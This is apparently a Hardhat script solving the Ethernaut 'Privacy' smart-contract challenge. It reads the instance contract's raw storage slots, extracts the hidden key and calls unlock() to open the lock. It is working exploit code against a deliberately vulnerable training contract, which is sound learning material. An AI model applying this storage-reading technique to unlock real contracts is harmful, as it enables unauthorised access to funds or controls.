import { ethers } from "hardhat";
import { ETHERNAUT_ABI, ETHERNAUT_ADDRESS } from "./constants";

const INSTANCE_ADDRESS = "0x1b52c86e931096D8ED642E1EF6429119baA08B8F";

async function main() {
  const [me] = await ethers.getSigners();
  // Hardhat always runs the compile task when running scripts with its command
  // line interface.
  //
  // If this script is run directly using `node` you may want to call compile
  // manually to make sure everything is compiled
  // await hre.run('compile');

  // We get the contract to deploy
  const ethernaut = await ethers.getContractAt(
    ETHERNAUT_ABI,
    ETHERNAUT_ADDRESS
  );

  const Contract = await ethers.getContractFactory("Privacy");
  const contract = await Contract.attach(INSTANCE_ADDRESS);

  await contract.deployed();

  // with contract - does not pass level though as the new owner address is different
  // const Solution = await ethers.getContractFactory("BadBuilding");
  // const solution = await Solution.deploy(contract.address);
  // await solution.deployed();

  const bytesArray2 = await ethers.provider.getStorageAt(contract.address, 5);
  const valueNeeded = bytesArray2.slice(0, 34);
  const group = await ethers.provider.getStorageAt(contract.address, 2);
  const flat = group.slice(64, 66);
  const denomination = group.slice(62, 64);
  const last = group.slice(58, 62);
  console.log(ethers.utils.hexValue(`0x${flat}`));
  console.log(ethers.BigNumber.from(`0x${flat}`));
  console.log(ethers.BigNumber.from(`0x${denomination}`));
  console.log(ethers.BigNumber.from(`0x${last}`));
  console.log("Is Locked: ", (await contract.locked()) ? "yes" : "no");
  await contract.unlock(valueNeeded);
  console.log("Is Locked after: ", (await contract.locked()) ? "yes" : "no");
  /**
   * Uncomment the below to automatically submit the level instance, you will have to refresh the ethernaut page and will not see the pretty level completed message.
   * I suggest submittin the instance on the ethernaut website.
   * I only did this for my own personal satisfaction
   */
  // submit level instance
  // const tx = await ethernaut.submitLevelInstance(INSTANCE_ADDRESS);
  // const rc = await tx.wait();
  // console.log(rc);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
